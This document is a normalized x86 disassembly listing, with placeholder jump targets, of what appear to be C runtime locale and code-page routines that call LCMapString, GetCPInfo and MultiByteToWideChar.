lea eax [ ebx + 0x48 ]
push [ eax ]
mov [ ebp - 0xc ] eax
push r--data
push [ r--data ]
push 0x3
push 0x351
push edi
call sub_1002c793
mov eax [ ebp - 0xc ]
add esp 0x18
mov [ ebp - 0xc ] eax
mov [ ebp - 0x4 ] r--data
push [ ebx + 0x58 ]
mov eax [ ebp - 0xc ]
push [ eax ]
call sub_1002a840
pop ecx
pop ecx
test eax eax
je r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_100276d9
add esp 0x14
inc [ ebp - 0x8 ]
mov eax [ ebp - 0x8 ]
add [ ebp - 0x4 ] 0xc
shl eax 0x4
lea ebx [ eax + esi ]
lea eax [ ebx + 0x48 ]
push [ eax ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
push r--data
push [ eax ]
push 0x3
push 0x351
push edi
call sub_1002c793
add esp 0x18
cmp [ ebp - 0x4 ] r--data
jl r-xdata
and [ ebp - 0x10 ] 0x0
push r--data
push 0x351
push edi
call sub_100367f7
add esp 0xc
test eax eax
je r-xdata
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
push [ ebp - 0x14 ]
call sub_10027a85
mov eax [ esi + 0x50 ]
mov edi [ InterlockedDecrement@IAT ]
xor ebx ebx
pop ecx
cmp eax ebx
je r-xdata
mov eax [ esi + 0x50 ]
mov ebx [ InterlockedDecrement@IAT ]
test eax eax
je r-xdata
mov eax [ esi + 0x54 ]
cmp eax ebx
je r-xdata
push eax
call edi
test eax eax
jne r-xdata
mov eax [ esi + 0x54 ]
test eax eax
je r-xdata
push eax
call ebx
test eax eax
jne r-xdata
mov eax [ esi + 0x68 ]
mov [ esi + 0x54 ] ebx
mov [ esi + 0x4c ] ebx
mov [ esi + 0x50 ] ebx
mov [ esi + 0x48 ] ebx
push eax
call edi
test eax eax
jne r-xdata
push [ esi + 0x50 ]
call sub_10027a85
pop ecx
mov eax [ ebp - 0x14 ]
and [ esi + 0x54 ] 0x0
and [ esi + 0x4c ] 0x0
mov [ esi + 0x50 ] eax
mov [ esi + 0x48 ] edi
mov eax edi
jmp r-xdata
push eax
call ebx
test eax eax
jne r-xdata
push [ esi + 0x50 ]
call sub_10027a85
pop ecx
push [ esi + 0x54 ]
call sub_10027a85
pop ecx
pop edi
push [ esi + 0x54 ]
call sub_10027a85
pop ecx
sub_1002cae6
mov edi edi
push ebp
mov ebp esp
sub esp 0xb4
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi [ ebp + 0x14 ]
mov [ ebp - 0x9c ] eax
mov eax [ ebp + 0x18 ]
mov [ ebp - 0xa4 ] edi
mov [ ebp - 0xa0 ] eax
call sub_1002f139
add eax 0x9c
lea ecx [ eax + 0x28 ]
mov [ ebp - 0xac ] ecx
lea ecx [ eax + 0x2c ]
lea ebx [ eax + 0x20 ]
add eax 0xaf
mov [ ebp - 0xa8 ] ecx
mov [ ebp - 0x98 ] eax
test esi esi
je r-xdata
xor eax eax
cmp [ ebp - 0x9c ] 0x0
je r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
cmp [ esi ] 0x43
jne r-xdata
push esi
call sub_10027160
mov edi 0x83
pop ecx
mov [ ebp - 0xb0 ] eax
cmp eax edi
jae r-xdata
cmp [ esi + 0x1 ] 0x0
jne r-xdata
and [ ebp - 0xb4 ] 0x0
lea eax [ ebp - 0x94 ]
push esi
push eax
call sub_1002c7d3
pop ecx
pop ecx
test eax eax
jne r-xdata
push esi
push [ ebp - 0x98 ]
call sub_1002a840
pop ecx
pop ecx
test eax eax
je r-xdata
push r--data
push [ ebp + 0x10 ]
push [ ebp - 0x9c ]
call sub_1002e87c
add esp 0xc
xor esi esi
test eax eax
je r-xdata
lea eax [ ebp - 0x94 ]
push eax
push ebx
push eax
call sub_10036edb
add esp 0xc
test eax eax
je r-xdata
xor esi esi
push esi
push [ ebp - 0xa8 ]
call sub_1002a840
pop ecx
pop ecx
test eax eax
je r-xdata
cmp edi esi
je r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_100276d9
add esp 0x14
movzx eax [ ebx + 0x4 ]
mov ecx [ ebp - 0xac ]
mov [ ecx ] eax
lea eax [ ebp - 0x94 ]
push eax
push edi
push [ ebp - 0x98 ]
call sub_1002c8fc
add esp 0xc
cmp [ esi ] 0x0
je r-xdata
cmp [ ebp - 0xa0 ] esi
je r-xdata
push 0x6
push ebx
push [ ebp - 0xa4 ]
call sub_1002a0f0
add esp 0xc
mov eax [ ebp - 0xa0 ]
cmp eax esi
je r-xdata
xor eax eax
mov [ edi ] ax
mov [ edi + 0x2 ] ax
mov [ edi + 0x4 ] ax
mov eax [ ebp - 0xb4 ]
mov esi r--data
mov eax [ ebp - 0xb0 ]
cmp eax edi
jb r-xdata
push [ ebp - 0x98 ]
push [ ebp + 0x10 ]
push [ ebp - 0x9c ]
call sub_1002e87c
add esp 0xc
test eax eax
je r-xdata
push 0x4
push [ ebp - 0xac ]
push [ ebp - 0xa0 ]
call sub_1002a0f0
add esp 0xc
mov eax [ ebp - 0x9c ]
jmp r-xdata
mov [ eax ] esi
xor esi esi
push esi
push esi
push esi
push esi
push esi
call sub_100276d9
add esp 0x14
jmp r-xdata
inc eax
push eax
push esi
push edi
push [ ebp - 0xa8 ]
call sub_1003686b
add esp 0x10
test eax eax
je r-xdata
mov eax [ ebp - 0x98 ]
jmp r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_100276d9
add esp 0x14
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10027150
leave
retn
cmp [ ebp - 0xa4 ] esi
je r-xdata
sub_1002cd17
mov edi edi
push ebp
mov ebp esp
sub esp 0x1c4
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push edi
mov ebx ecx
call sub_1002f139
push [ ebp + 0x8 ]
mov edi eax
lea eax [ ebp - 0x198 ]
push eax
lea eax [ ebp - 0x1b0 ]
push eax
push 0x83
lea eax [ ebp - 0x88 ]
push eax
push ebx
add edi 0x1d0
call sub_1002cae6
add esp 0x18
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
shl eax 0x4
lea ebx [ eax + esi ]
push [ ebx + 0x48 ]
lea eax [ ebp - 0x88 ]
push eax
call sub_1002a840
pop ecx
pop ecx
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebx + 0x48 ]
lea eax [ ebp - 0x88 ]
push eax
call sub_10027160
add eax 0x5
push eax
mov [ ebp - 0x18c ] eax
call sub_1002ddb0
pop ecx
pop ecx
mov [ ebp - 0x190 ] eax
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
call sub_10027150
leave
retn
mov eax [ ebx + 0x48 ]
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x1a4 ] eax
lea eax [ esi + ecx * 4 + 0xc ]
add ecx 0x6
imul ecx ecx 0x6
mov [ ebp - 0x194 ] eax
mov eax [ eax ]
mov [ ebp - 0x1a8 ] eax
lea eax [ ecx + esi ]
push 0x6
push eax
mov [ ebp - 0x19c ] eax
lea eax [ ebp - 0x1c4 ]
push eax
call sub_1002a0f0
mov eax [ esi + 0x4 ]
lea ecx [ ebp - 0x88 ]
push ecx
mov ecx [ ebp - 0x18c ]
mov [ ebp - 0x1b4 ] eax
mov eax [ ebp - 0x190 ]
add ecx 0xfffffffc
add eax 0x4
push ecx
push eax
call sub_1002e87c
add esp 0x18
test eax eax
je r-xdata
mov eax [ ebp - 0x190 ]
mov ecx [ ebp - 0x194 ]
add eax 0x4
mov [ ebx + 0x48 ] eax
movzx eax [ ebp - 0x1b0 ]
mov [ ecx ] eax
push 0x6
lea eax [ ebp - 0x1b0 ]
push eax
push [ ebp - 0x19c ]
call sub_1002a0f0
add esp 0xc
cmp [ ebp + 0x8 ] 0x2
jne r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_100276d9
add esp 0x14
cmp [ ebp + 0x8 ] 0x1
jne r-xdata
mov eax [ ebp - 0x198 ]
and [ ebp - 0x18c ] 0x0
mov [ esi + 0x4 ] eax
mov eax [ edi + 0x24 ]
mov ecx [ edi + 0x20 ]
mov [ ebp - 0x19c ] eax
mov eax edi
mov eax [ ebp + 0x8 ]
imul eax eax 0xc
push esi
call [ eax + r--data ]
pop ecx
test eax eax
je r-xdata
mov eax [ ebp - 0x198 ]
mov [ esi + 0x8 ] eax
mov eax [ ebp - 0x18c ]
test eax eax
je r-xdata
mov edx [ eax ]
inc [ ebp - 0x18c ]
mov [ eax ] ecx
mov ecx [ ebp - 0x19c ]
mov [ ebp - 0x1bc ] edx
mov edx [ eax + 0x4 ]
mov [ eax + 0x4 ] ecx
mov ecx [ ebp - 0x1bc ]
add eax 0x8
cmp [ ebp - 0x18c ] 0x5
mov [ ebp - 0x19c ] edx
jl r-xdata
cmp [ ebp - 0x1a4 ] rw-data
je r-xdata
mov eax [ ebp - 0x1a4 ]
push [ ebp - 0x190 ]
mov [ ebx + 0x48 ] eax
call sub_10027a85
mov eax [ ebp - 0x1a8 ]
pop ecx
mov ecx [ ebp - 0x194 ]
mov [ ecx ] eax
mov eax [ ebp - 0x1b4 ]
mov [ esi + 0x4 ] eax
jmp r-xdata
cmp [ ebp - 0x18c ] 0x5
jne r-xdata
lea eax [ edi + eax * 8 ]
mov edx [ eax ]
mov [ edi ] edx
mov edx [ eax + 0x4 ]
mov [ edi + 0x4 ] edx
mov [ eax ] ecx
mov ecx [ ebp - 0x19c ]
mov [ eax + 0x4 ] ecx
mov edx [ esi + 0x4 ]
cmp edx [ eax ]
je r-xdata
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov eax [ ebp - 0x190 ]
add ecx 0x5
shl ecx 0x4
mov [ eax ] 0x1
mov [ ecx + esi ] eax
mov eax [ ebp + 0x8 ]
add eax 0x5
shl eax 0x4
lea edi [ eax + esi ]
push [ edi ]
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov eax [ edi + 0x4 ]
mov [ esi + 0xa8 ] eax
push 0x1
push [ esi + 0x14 ]
lea eax [ ebp - 0x188 ]
push [ esi + 0x4 ]
push eax
push 0x7f
push r--data
push 0x1
push 0x0
call sub_10037286
add esp 0x20
test eax eax
je r-xdata
push [ edi ]
call sub_10027a85
push [ ebx + 0x54 ]
call sub_10027a85
and [ ebx + 0x4c ] 0x0
pop ecx
pop ecx
and [ edi + 0x4 ] 0x0
xor eax eax
mov ecx 0x1ff
and [ ebp + eax * 2 - 0x188 ] cx
inc eax
cmp eax 0x7f
jb r-xdata
push 0xfe
push [ rw-data ]
lea eax [ ebp - 0x188 ]
push eax
call sub_10027c61
add esp 0xc
neg eax
sbb eax eax
inc eax
mov [ edi + 0x4 ] eax
jmp r-xdata
mov eax [ esi + 0x4 ]
mov [ edi ] eax
sub_1002d019
mov edi edi
push ebp
mov ebp esp
sub esp 0x98
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
xor ebx ebx
mov esi edx
push edi
mov [ ebp - 0x98 ] esi
cmp eax ebx
je r-xdata
mov [ ebp - 0x90 ] 0x1
mov [ ebp - 0x8c ] ebx
cmp ecx ebx
je r-xdata
cmp ecx ebx
je r-xdata
call sub_1002c969
cmp [ ecx ] 0x4c
jne r-xdata
shl eax 0x4
mov eax [ eax + esi + 0x48 ]
jmp r-xdata
push eax
call sub_1002cd17
pop ecx
jmp r-xdata
push ebx
push ebx
push ebx
push 0x83
lea eax [ ebp - 0x88 ]
push eax
push ecx
call sub_1002cae6
add esp 0x18
cmp eax ebx
je r-xdata
cmp [ ecx + 0x1 ] 0x43
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10027150
leave
retn
lea edi [ esi + 0x48 ]
cmp [ ecx + 0x2 ] 0x5f
jne r-xdata
inc ebx
add edi 0x10
cmp ebx 0x5
jle r-xdata
push [ edi ]
lea eax [ ebp - 0x88 ]
push eax
call sub_1002a840
pop ecx
pop ecx
test eax eax
je r-xdata
mov edi ecx
test ebx ebx
je r-xdata
xor eax eax
cmp [ ebp - 0x90 ] eax
jne r-xdata
inc [ ebp - 0x8c ]
push ebx
lea ecx [ ebp - 0x88 ]
call sub_1002cd17
pop ecx
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
sub eax edi
mov [ ebp - 0x90 ] eax
je r-xdata
cmp [ ebp - 0x8c ] eax
je r-xdata
and [ ebp - 0x90 ] eax
jmp r-xdata
cmp [ ebx ] 0x3b
je r-xdata
mov [ ebp - 0x94 ] 0x1
mov esi r--data
jmp r-xdata
push eax
push edi
push [ esi ]
call sub_100372c8
add esp 0xc
test eax eax
jne r-xdata
inc [ ebp - 0x94 ]
add esi 0xc
cmp esi r--data
jle r-xdata
push [ esi ]
call sub_10027160
pop ecx
cmp [ ebp - 0x90 ] eax
je r-xdata
mov eax [ ebp - 0x90 ]
inc ebx
push r--data
push ebx
call sub_10027c10
mov edi eax
xor esi esi
pop ecx
pop ecx
cmp edi esi
jne r-xdata
cmp [ ebp - 0x94 ] 0x5
jg r-xdata
cmp [ ebx ] 0x3b
jne r-xdata
add edi ebx
cmp [ edi ] 0x0
je r-xdata
push edi
push ebx
lea eax [ ebp - 0x88 ]
push 0x83
push eax
call sub_1003686b
add esp 0x10
test eax eax
je r-xdata
xor eax eax
cmp [ ebp - 0x8c ] eax
je r-xdata
inc edi
cmp [ edi ] 0x0
jne r-xdata
push [ ebp - 0x94 ]
mov esi [ ebp - 0x98 ]
lea ecx [ ebp - 0x88 ]
mov [ ebp + edi - 0x88 ] 0x0
call sub_1002cd17
pop ecx
test eax eax
je r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_100276d9
add esp 0x14
mov esi [ ebp - 0x98 ]
jmp r-xdata
push r--data
push edi
call sub_10037390
mov ebx eax
pop ecx
pop ecx
test ebx ebx
je r-xdata
inc [ ebp - 0x8c ]
sub_1002d234
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x5
push esi
push edi
ja r-xdata
xor eax eax
cmp [ ebp + 0xc ] 0x0
je r-xdata
xor edi edi
inc edi
push edi
push 0x8
call sub_1002ddf5
mov esi eax
pop ecx
pop ecx
test esi esi
jne r-xdata
push edi
push 0xd8
call sub_1002ddf5
pop ecx
pop ecx
mov [ esi ] eax
test eax eax
jne r-xdata
call sub_1002d4db
mov [ eax ] 0xc
push edi
push 0x220
call sub_1002ddf5
pop ecx
pop ecx
mov [ esi + 0x4 ] eax
test eax eax
jne r-xdata
push esi
call sub_10027a85
mov eax [ esi ]
mov ecx rw-data
call sub_1002c5a1
push [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
mov edx [ esi ]
call sub_1002d019
pop ecx
test eax eax
jne r-xdata
push [ esi ]
call sub_10027a85
push esi
call sub_10027a85
pop ecx
jmp r-xdata
push [ esi + 0x4 ]
mov eax [ esi ]
push [ eax + 0x4 ]
call sub_10034250
pop ecx
pop ecx
test eax eax
je r-xdata
push [ esi ]
call sub_1002c508
push [ esi ]
call sub_1002c330
push esi
call sub_10027a85
add esp 0xc
jmp r-xdata
pop ecx
jmp r-xdata
mov eax [ esi + 0x4 ]
mov [ eax ] edi
mov eax [ esi + 0x4 ]
mov [ eax ] edi
push [ esi + 0x4 ]
call sub_10027a85
push [ esi ]
call sub_1002c508
push [ esi ]
call sub_1002c330
push esi
call sub_10027a85
add esp 0x10
xor esi esi
jmp r-xdata
pop edi
pop esi
pop ebp
retn
mov eax esi
jmp r-xdata
sub_1002d329
push 0x14
push r--data
call sub_1002fdfc
xor ebx ebx
mov [ ebp - 0x20 ] ebx
cmp [ ebp + 0x8 ] 0x5
jbe r-xdata
call sub_1002f139
mov esi eax
mov [ ebp - 0x1c ] esi
call sub_1002c605
or [ esi + 0x70 ] 0x10
mov [ ebp - 0x4 ] ebx
push 0x1
push 0xd8
call sub_1002ddf5
pop ecx
pop ecx
mov edi eax
mov [ ebp - 0x24 ] edi
cmp edi ebx
je r-xdata
call sub_1002d4db
mov [ eax ] 0x16
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_10027801
add esp 0x14
xor eax eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1002d494
mov eax [ ebp - 0x20 ]
push 0xc
call sub_100301fe
pop ecx
mov [ ebp - 0x4 ] 0x1
mov ecx [ esi + 0x6c ]
mov eax edi
call sub_1002c5a1
mov [ ebp - 0x4 ] ebx
call sub_1002d457
push [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
mov edx edi
call sub_1002d019
pop ecx
mov [ ebp - 0x20 ] eax
cmp eax ebx
je r-xdata
call sub_1002fe41
retn
push edi
call sub_1002c508
push edi
call sub_1002c330
pop ecx
pop ecx
cmp [ ebp + 0xc ] ebx
je r-xdata
push 0xc
call sub_100301fe
pop ecx
mov [ ebp - 0x4 ] 0x2
lea ebx [ esi + 0x6c ]
mov eax ebx
call sub_1002c5c7
push edi
call sub_1002c508
pop ecx
test [ esi + 0x70 ] 0x2
jne r-xdata
push rw-data
push [ ebp + 0xc ]
call sub_1002a840
pop ecx
pop ecx
test eax eax
je r-xdata
and [ ebp - 0x4 ] 0x0
call sub_1002d463
jmp r-xdata
test [ rw-data ] 0x1
jne r-xdata
mov [ rw-data ] 0x1
mov edi [ ebx ]
mov eax rw-data
call sub_1002c5c7
push 0x18
mov eax [ rw-data ]
add eax 0xc
push eax
push rw-data
call sub_1002a0f0
add esp 0xc
call sub_1002c67b
sub_1002d499
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov eax [ ecx * 8 + rw-data ]
pop ebp
retn
inc ecx
cmp ecx 0x2d
jb r-xdata
cmp eax [ ecx * 8 + rw-data ]
je r-xdata
lea ecx [ eax - 0x13 ]
cmp ecx 0x11
ja r-xdata
add eax 0xffffff44
push 0xe
pop ecx
cmp ecx eax
sbb eax eax
and eax ecx
add eax 0x8
pop ebp
retn
push 0xd
pop eax
pop ebp
retn
sub_1002d501
mov edi edi
push ebp
mov ebp esp
push esi
call sub_1002d4ee
mov ecx [ ebp + 0x8 ]
push ecx
mov [ eax ] ecx
call sub_1002d499
pop ecx
mov esi eax
call sub_1002d4db
mov [ eax ] esi
pop esi
pop ebp
retn
sub_1002d524
mov edi edi
push ebp
mov ebp esp
sub esp 0x4c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
xor ebx ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
mov [ ebp - 0x2c ] ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x4c ] esi
mov [ ebp - 0x48 ] ebx
cmp [ esi + 0x14 ] ebx
je r-xdata
lea edi [ esi + 0xc0 ]
mov eax [ edi ]
cmp eax ebx
je r-xdata
lea eax [ esi + 0x4 ]
cmp [ eax ] ebx
jne r-xdata
mov [ edi ] ebx
mov [ esi + 0xc4 ] ebx
mov [ esi + 0xc8 ] r--data
mov [ esi + 0xcc ] r--data
mov [ esi + 0xd0 ] r--data
mov [ esi + 0xac ] 0x1
xor eax eax
push eax
call [ InterlockedDecrement@IAT ]
push 0x4
call sub_1002ddb0
push 0x2
mov edi 0x180
push edi
mov [ ebp - 0x2c ] eax
call sub_1002ddf5
push 0x1
push edi
mov [ ebp - 0x1c ] eax
call sub_1002ddf5
push 0x1
push edi
mov [ ebp - 0x20 ] eax
call sub_1002ddf5
push 0x1
push 0x101
mov [ ebp - 0x28 ] eax
call sub_1002ddf5
add esp 0x24
mov [ ebp - 0x24 ] eax
cmp [ ebp - 0x2c ] ebx
je r-xdata
push eax
movzx eax [ esi + 0x30 ]
push 0x1004
push eax
lea eax [ ebp - 0x4c ]
push ebx
push eax
call sub_10031d82
add esp 0x14
test eax eax
jne r-xdata
push [ ebp - 0x2c ]
call sub_10027a85
push [ ebp - 0x1c ]
call sub_10027a85
push [ ebp - 0x20 ]
call sub_10027a85
push [ ebp - 0x28 ]
call sub_10027a85
xor ebx ebx
add esp 0x10
inc ebx
jmp r-xdata
cmp [ ebp - 0x1c ] ebx
je r-xdata
push [ ebp - 0x24 ]
call sub_10027a85
pop ecx
mov eax ebx
jmp r-xdata
cmp eax ebx
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10027150
leave
retn
cmp [ ebp - 0x20 ] ebx
je r-xdata
cmp [ ebp - 0x28 ] ebx
je r-xdata
mov eax [ ebp - 0x2c ]
mov [ eax ] ebx
xor eax eax
mov ecx [ ebp - 0x24 ]
mov [ eax + ecx ] al
inc eax
cmp eax 0x100
jl r-xdata
lea eax [ ebp - 0x18 ]
push eax
push [ esi + 0x4 ]
call [ GetCPInfo@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x18 ] 0x5
ja r-xdata
movzx eax [ ebp - 0x18 ]
cmp eax 0x1
mov [ ebp - 0x30 ] eax
jle r-xdata
mov eax [ ebp - 0x1c ]
push ebx
push ebx
push [ esi + 0x4 ]
add eax 0x100
push eax
push 0x100
push [ ebp - 0x24 ]
mov [ ebp - 0x40 ] eax
push 0x1
push ebx
call sub_10037286
add esp 0x20
test eax eax
je r-xdata
cmp [ ebp - 0x12 ] bl
je r-xdata
mov ecx [ ebp - 0x20 ]
mov eax [ ebp - 0x24 ]
push ebx
push [ esi + 0x4 ]
mov edi 0xff
push edi
add ecx 0x81
push ecx
push edi
inc eax
push eax
push 0x100
push [ esi + 0x14 ]
push ebx
call sub_1002dd42
add esp 0x24
test eax eax
je r-xdata
lea eax [ ebp - 0x11 ]
mov eax [ ebp - 0x28 ]
push ebx
push [ esi + 0x4 ]
add eax 0x81
push edi
push eax
mov eax [ ebp - 0x24 ]
push edi
inc eax
push eax
push 0x200
push [ esi + 0x14 ]
push ebx
call sub_1002dd42
add esp 0x24
test eax eax
je r-xdata
movzx edi [ eax - 0x1 ]
movzx ecx cl
jmp r-xdata
mov eax [ ebp - 0x1c ]
mov edi [ ebp - 0x20 ]
lea ecx [ eax + 0xfe ]
xor edx edx
cmp [ ebp - 0x30 ] 0x1
mov [ ecx ] dx
mov edx [ ebp - 0x28 ]
mov [ ebp - 0x3c ] ecx
lea ecx [ edi + 0x80 ]
mov [ edi + 0x7f ] bl
mov [ edx + 0x7f ] bl
mov [ ecx ] bl
mov [ ebp - 0x44 ] ecx
lea ecx [ edx + 0x80 ]
mov [ ebp - 0x38 ] ecx
mov [ ecx ] bl
jle r-xdata
cmp edi ecx
jle r-xdata
push 0xfe
lea ecx [ eax + 0x200 ]
push ecx
push eax
call sub_1002a0f0
push 0x7f
lea eax [ edi + 0x100 ]
push eax
push edi
call sub_1002a0f0
mov eax [ ebp - 0x28 ]
push 0x7f
lea ecx [ eax + 0x100 ]
push ecx
push eax
call sub_1002a0f0
mov eax [ esi + 0xc0 ]
add esp 0x24
cmp eax ebx
je r-xdata
cmp [ ebp - 0x12 ] bl
je r-xdata
mov ecx [ ebp - 0x24 ]
mov [ edi + ecx ] 0x20
movzx ecx [ eax ]
inc edi
inc eax
inc eax
cmp [ eax - 0x1 ] bl
jne r-xdata
mov eax [ ebp - 0x2c ]
mov [ eax ] 0x1
mov [ esi + 0xc0 ] eax
mov eax [ ebp - 0x40 ]
mov [ esi + 0xc8 ] eax
mov eax [ ebp - 0x3c ]
mov [ esi + 0xc4 ] eax
mov eax [ ebp - 0x44 ]
mov [ esi + 0xcc ] eax
mov eax [ ebp - 0x38 ]
mov [ esi + 0xd0 ] eax
mov eax [ ebp - 0x30 ]
mov [ esi + 0xac ] eax
push eax
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
lea ecx [ ebp - 0x11 ]
mov [ ebp - 0x1c ] ecx
mov cl [ eax ]
cmp cl bl
je r-xdata
mov eax [ esi + 0xc4 ]
sub eax 0xfe
push eax
call sub_10027a85
mov eax [ esi + 0xcc ]
mov edi 0x80
sub eax edi
push eax
call sub_10027a85
mov eax [ esi + 0xd0 ]
sub eax edi
push eax
call sub_10027a85
push [ esi + 0xc0 ]
call sub_10027a85
add esp 0x10
movzx ecx [ ecx - 0x1 ]
movzx edx dl
cmp ecx edx
mov [ ebp - 0x20 ] ecx
jg r-xdata
mov ecx [ ebp - 0x1c ]
inc ecx
inc ecx
mov [ ebp - 0x1c ] ecx
cmp [ ecx - 0x1 ] bl
jne r-xdata
lea ecx [ eax + ecx * 2 + 0x100 ]
jmp r-xdata
mov dl [ ecx ]
cmp dl bl
je r-xdata
inc [ ebp - 0x20 ]
mov edx 0x8000
mov [ ecx ] dx
inc ecx
inc ecx
mov [ ebp - 0x34 ] ecx
mov ecx [ ebp - 0x1c ]
movzx ecx [ ecx ]
cmp [ ebp - 0x20 ] ecx
jle r-xdata
mov ecx [ ebp - 0x34 ]
sub_1002d97d
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
pop ebp
retn
sub eax 0x8
cmp [ eax ] 0xdddd
jne r-xdata
push eax
call sub_10027a85
pop ecx
sub_1002d99d
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
xor ebx ebx
push edi
mov esi ecx
cmp [ rw-data ] ebx
jne r-xdata
cmp [ ebp + 0x14 ] ebx
jle r-xdata
push ebx
push ebx
xor edi edi
inc edi
push edi
push r--data
push 0x100
push ebx
call [ LCMapStringW@IAT ]
test eax eax
je r-xdata
mov eax [ rw-data ]
cmp eax 0x2
je r-xdata
mov ecx [ ebp + 0x14 ]
mov eax [ ebp + 0x10 ]
call [ GetLastError@IAT ]
cmp eax 0x78
jne r-xdata
mov [ rw-data ] edi
jmp r-xdata
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x10 ] ebx
cmp [ ebp + 0x8 ] ebx
jne r-xdata
cmp eax ebx
je r-xdata
mov eax [ ebp + 0x14 ]
sub eax ecx
dec eax
cmp eax [ ebp + 0x14 ]
jge r-xdata
inc eax
cmp ecx ebx
jne r-xdata
mov [ rw-data ] 0x2
cmp [ ebp + 0x20 ] ebx
jne r-xdata
mov eax [ esi ]
mov eax [ eax + 0x14 ]
mov [ ebp + 0x8 ] eax
cmp eax 0x1
jne r-xdata
mov [ ebp + 0x14 ] eax
inc eax
dec ecx
cmp [ eax ] bl
je r-xdata
or ecx 0xffffffff
push [ ebp + 0x8 ]
call sub_100373d0
pop ecx
mov [ ebp - 0x14 ] eax
cmp eax 0xffffffff
jne r-xdata
mov eax [ esi ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x20 ] eax
xor eax eax
jmp r-xdata
mov [ ebp - 0x8 ] ebx
cmp [ ebp + 0x20 ] ebx
jne r-xdata
cmp eax [ ebp + 0x20 ]
je r-xdata
lea esp [ ebp - 0x20 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10027150
leave
retn
mov esi [ MultiByteToWideChar@IAT ]
xor eax eax
cmp [ ebp + 0x24 ] ebx
push ebx
push ebx
push [ ebp + 0x14 ]
setne al
push [ ebp + 0x10 ]
lea eax [ eax * 8 + 0x1 ]
push eax
push [ ebp + 0x20 ]
call esi
mov edi eax
cmp edi ebx
je r-xdata
mov eax [ esi ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x20 ] eax
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ LCMapStringA@IAT ]
mov esi eax
push ebx
push ebx
lea ecx [ ebp + 0x14 ]
push ecx
push [ ebp + 0x10 ]
push eax
push [ ebp + 0x20 ]
call sub_10037419
add esp 0x18
mov [ ebp - 0xc ] eax
cmp eax ebx
je r-xdata
jle r-xdata
mov eax [ ebp - 0x10 ]
cmp eax ebx
je r-xdata
push [ ebp - 0xc ]
call sub_10027a85
pop ecx
mov esi [ LCMapStringA@IAT ]
push ebx
push ebx
push [ ebp + 0x14 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call esi
mov [ ebp - 0x8 ] eax
cmp eax ebx
jne r-xdata
mov [ ebp - 0xc ] ebx
push 0xffffffe0
xor edx edx
pop eax
div edi
cmp eax 0x2
jb r-xdata
mov eax esi
cmp [ ebp + 0x18 ] eax
je r-xdata
jle r-xdata
xor esi esi
jmp r-xdata
push edi
push [ ebp - 0xc ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push 0x1
push [ ebp + 0x20 ]
call esi
test eax eax
je r-xdata
lea eax [ edi + edi + 0x8 ]
cmp eax 0x400
ja r-xdata
push eax
call sub_10027a85
pop ecx
xor edi edi
cmp eax 0xffffffe0
ja r-xdata
cmp [ ebp - 0xc ] ebx
je r-xdata
push [ ebp - 0xc ]
call sub_1002d97d
mov eax [ ebp - 0x8 ]
pop ecx
jmp r-xdata
mov esi [ LCMapStringW@IAT ]
push ebx
push ebx
push edi
push [ ebp - 0xc ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call esi
mov ecx eax
mov [ ebp - 0x8 ] ecx
cmp ecx ebx
je r-xdata
push eax
call sub_1002a4a4
pop ecx
cmp eax ebx
je r-xdata
call sub_100375d0
mov eax esp
cmp eax ebx
je r-xdata
push [ ebp - 0x8 ]
push ebx
push edi
call sub_10027650
add esp 0xc
push [ ebp - 0x8 ]
push edi
